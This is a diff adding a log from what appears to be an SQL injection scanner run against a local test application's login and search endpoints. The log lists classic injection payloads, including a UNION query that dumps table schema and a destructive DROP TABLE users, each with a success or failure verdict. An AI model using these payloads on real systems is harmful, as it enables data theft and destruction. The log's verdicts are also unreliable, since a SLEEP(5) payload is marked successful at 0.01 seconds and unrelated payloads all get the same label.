@@ -1,0 +1,10 @@
+2025-08-23 15:53:14,631 - [FAILED] URL: http://127.0.0.1:5000/login | Payload: ' OR '1'='1 | Time: 0.01s | Detail: No exploit
+2025-08-23 15:53:14,634 - [SUCCESS] URL: http://127.0.0.1:5000/search | Payload: ' OR '1'='1 | Time: 0.00s | Detail: Data exfiltration via UNION
+2025-08-23 15:53:15,152 - [FAILED] URL: http://127.0.0.1:5000/login | Payload: ' OR 1=1-- | Time: 0.01s | Detail: No exploit
+2025-08-23 15:53:15,157 - [SUCCESS] URL: http://127.0.0.1:5000/search | Payload: ' OR 1=1-- | Time: 0.00s | Detail: Data exfiltration via UNION
+2025-08-23 15:53:15,668 - [SUCCESS] URL: http://127.0.0.1:5000/login | Payload: ' UNION SELECT sql, '' FROM sqlite_master WHERE type='table'-- | Time: 0.01s | Detail: Possible auth bypass
+2025-08-23 15:53:15,670 - [SUCCESS] URL: http://127.0.0.1:5000/search | Payload: ' UNION SELECT sql, '' FROM sqlite_master WHERE type='table'-- | Time: 0.00s | Detail: Data exfiltration via UNION
+2025-08-23 15:53:16,176 - [SUCCESS] URL: http://127.0.0.1:5000/login | Payload: '; DROP TABLE users-- | Time: 0.01s | Detail: Possible auth bypass
+2025-08-23 15:53:16,178 - [SUCCESS] URL: http://127.0.0.1:5000/search | Payload: '; DROP TABLE users-- | Time: 0.00s | Detail: Data exfiltration via UNION
+2025-08-23 15:53:16,688 - [SUCCESS] URL: http://127.0.0.1:5000/login | Payload: ' AND SLEEP(5)-- | Time: 0.01s | Detail: Possible auth bypass
+2025-08-23 15:53:16,692 - [SUCCESS] URL: http://127.0.0.1:5000/search | Payload: ' AND SLEEP(5)-- | Time: 0.00s | Detail: Data exfiltration via UNION
